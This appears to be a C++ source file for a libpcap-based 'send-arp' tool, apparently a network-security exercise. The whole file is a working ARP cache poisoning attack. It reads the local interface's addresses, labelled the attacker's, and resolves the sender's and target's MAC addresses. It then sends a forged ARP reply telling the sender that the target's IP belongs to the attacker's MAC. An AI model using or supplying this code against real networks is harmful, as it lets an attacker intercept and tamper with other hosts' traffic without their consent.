#include <bits/stdc++.h>
#include <pcap.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include "ethhdr.h"
#include "arphdr.h"
using namespace std;


#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

string get_attacker_mac(const string &name) {
	ifstream mac_file("/sys/class/net/" + name + "/address");
	if(!mac_file.is_open()){
		perror("MAC file open error");
		exit(-1);
	}
	string res;
	mac_file>>res;
	return res;
}

string get_attacker_IP_addr(const string &name) {
	int fd=socket(AF_INET, SOCK_DGRAM, 0);
	if(fd==-1){
		perror("Socket open error");
		exit(-1);
	}
	ifreq ifr;
	ifr.ifr_addr.sa_family=AF_INET;
	strncpy(ifr.ifr_name,name.c_str(),IFNAMSIZ-1);
	if(ioctl(fd, SIOCGIFADDR, &ifr)<0){
		perror("ioctl error");
		exit(-1);
	}
	sockaddr_in*sock_in=(sockaddr_in*)&ifr.ifr_addr;
	const string ip_addr=inet_ntoa(sock_in->sin_addr);
	return ip_addr;
}

int main(int argc, char* argv[]) {
	if (argc < 4) {
		usage();
		return -1;
	}
	string iface=argv[1];
	string attacker_mac=get_attacker_mac(iface);
	string attacker_ip=get_attacker_IP_addr(iface);
	cout<<get_attacker_mac(iface)<<'\n'<<get_attacker_IP_addr(iface)<<'\n';
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	EthArpPacket packet;

	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	packet.eth_.smac_ = Mac(attacker_mac.c_str());
	packet.eth_.type_ = htons(EthHdr::Arp);
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(attacker_mac.c_str());
	packet.arp_.sip_ = htonl(Ip(attacker_ip.c_str()));
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(Ip(argv[3]));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	struct ArpHdr arp;
	struct pcap_pkthdr *header;
    const u_char *pkt;

	while (true){
		int res = pcap_next_ex(handle, &header, &pkt);
		if (res == 0){
			continue;
		}
		if (res==PCAP_ERROR||res==PCAP_ERROR_BREAK){
			printf("pcap_next_ex return %d error=%s\n", res, pcap_geterr(handle));
			break;
		}
		memcpy(&arp, pkt+sizeof(EthHdr), sizeof(ArpHdr));
		if(pkt && arp.sip()==*new string(argv[3]) && arp.op()==ArpHdr::Reply && arp.tip()==attacker_ip && arp.tmac()==attacker_mac){
			break;
		}
	}
	stringstream ss;
	for(int i=6;i<12;i++){
		ss<<setfill('0')<<setw(2)<<std::hex<<(int)pkt[i];
		if(i!=11)ss<<":";
	}
	string target_mac=ss.str();
	ss.str("");
	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	packet.eth_.smac_ = Mac(attacker_mac.c_str());
	packet.eth_.type_ = htons(EthHdr::Arp);
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(attacker_mac.c_str());
	packet.arp_.sip_ = htonl(Ip(attacker_ip.c_str()));
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(Ip(argv[2]));

	res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	while (true){
		int res = pcap_next_ex(handle, &header, &pkt);
		if (res == 0){
			continue;
		}
		if (res==PCAP_ERROR||res==PCAP_ERROR_BREAK){
			printf("pcap_next_ex return %d error=%s\n", res, pcap_geterr(handle));
			break;
		}
		memcpy(&arp, pkt+sizeof(EthHdr), sizeof(ArpHdr));
		if(pkt && arp.sip()==*new string(argv[2]) && arp.op()==ArpHdr::Reply && arp.tip()==attacker_ip && arp.tmac()==attacker_mac){
			break;
		}
	}
	for(int i=6;i<12;i++){
		ss<<setfill('0')<<setw(2)<<std::hex<<(int)pkt[i];
		if(i!=11)ss<<":";
	}
	string sender_mac=ss.str();
	ss.str("");
	cout<<target_mac<<'\n'<<sender_mac<<'\n';
	packet.eth_.dmac_ = Mac(sender_mac.c_str());
	packet.eth_.smac_ = Mac(attacker_mac.c_str());
	packet.eth_.type_ = htons(EthHdr::Arp);
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = Mac(attacker_mac.c_str());
	packet.arp_.sip_ = htonl(Ip(argv[3]));
	packet.arp_.tmac_ = Mac(sender_mac.c_str());
	packet.arp_.tip_ = htonl(Ip(argv[2]));

	res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	pcap_close(handle);
}
